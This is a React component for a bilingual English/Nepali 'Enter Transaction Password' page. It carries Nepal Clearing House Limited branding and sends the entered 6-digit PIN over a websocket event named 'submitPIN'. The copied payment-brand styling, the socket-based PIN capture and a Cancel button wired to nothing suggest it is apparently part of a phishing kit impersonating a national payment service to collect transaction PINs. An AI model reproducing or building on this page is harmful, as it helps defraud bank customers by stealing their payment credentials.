import React, { useState } from 'react';
import '../App.css';

function PIN({ socket }) {
  const [pin, setPin] = useState('');
  const [language, setLanguage] = useState('EN');
  const [error, setError] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    
    // Validate PIN length
    if (pin.length !== 6) {
      setError(language === 'EN' 
        ? 'PIN must be exactly 6 digits' 
        : 'पिन ६ अंकको हुनुपर्छ');
      return;
    }

    // If validation passes, emit the PIN
    socket.emit('submitPIN', { pin });
  };

  const handlePinChange = (e) => {
    const value = e.target.value;
    // Allow only numbers and limit to 6 digits
    if (/^\d{0,6}$/.test(value)) {
      setPin(value);
      setError(''); // Clear error when user types
    }
  };

  const toggleLanguage = (lang) => setLanguage(lang);

  return (
    <div className="login-page">
      <div className="login-container">
        {/* Logo Section */}
        <div className="login-logo">
          <img src="logo.png" alt="Logo" className="logo-image" />

          {/* Language Toggle Capsule */}
          <div className="language-toggle-capsule">
            <button
              className={`language-option ${language === 'EN' ? 'active' : ''}`}
              onClick={() => toggleLanguage('EN')}
            >
              EN
            </button>
            <button
              className={`language-option ${language === 'ने' ? 'active' : ''}`}
              onClick={() => toggleLanguage('ने')}
            >
              ने
            </button>
          </div>
        </div>
		
		{/* PIN Section */}
        <form onSubmit={handleSubmit}>
          <h6 className="text-primary font-weight-bold mb-0">
            {language === 'EN'
              ? "Enter Transaction Password"
              : 'लेनदेन पासवर्ड प्रविष्ट गर्नुहोस्।'}
          </h6>
          <div className="form-group mt-4 position-relative">
            <input
              id="transaction-password"
              name="pin"
              autoComplete="off"
              maxLength="6"
              placeholder={language === 'EN' ? 'Enter PIN' : 'पासवर्ड प्रविष्ट गर्नुहोस्'}
              type="password"
              className="form-control"
              value={pin}
              onChange={handlePinChange}
              style={{ borderColor: error ? '#dc3545' : '' }}
              required
            />
            {error && (
              <div style={{ 
                color: '#dc3545', 
                fontSize: '0.875rem', 
                marginTop: '0.5rem',
                textAlign: 'left'
              }}>
                {error}
              </div>
            )}
          </div>
          <br />
          <br />
          <div className="d-flex mt-2 mb-4">
            <button className="btn btn-outline-primary flex-grow-1 mr-2" type="button">
              {language === 'EN' ? 'Cancel' : 'रद्द गर्नुहोस्'}
            </button>
            <button 
              className="btn btn-primary flex-grow-1 ml-2" 
              type="submit"
              disabled={pin.length !== 6}
            >
              {language === 'EN' ? 'Submit' : 'पेश गर्नुहोस्।'}
            </button>
          </div>
        </form>
        <br />
        <br />
        <br />
        <br />
        <br />

        {/* Footer Section */}
        <footer>
          <img src="footer.png" alt="Powered by NPS" className="powered-by-logo" />
          <p>version: 1.11.5</p>
          <p>Copyright © Nepal Clearing House Limited, 2018-2024</p>
        </footer>
      </div>
    </div>
  );
}

export default PIN;
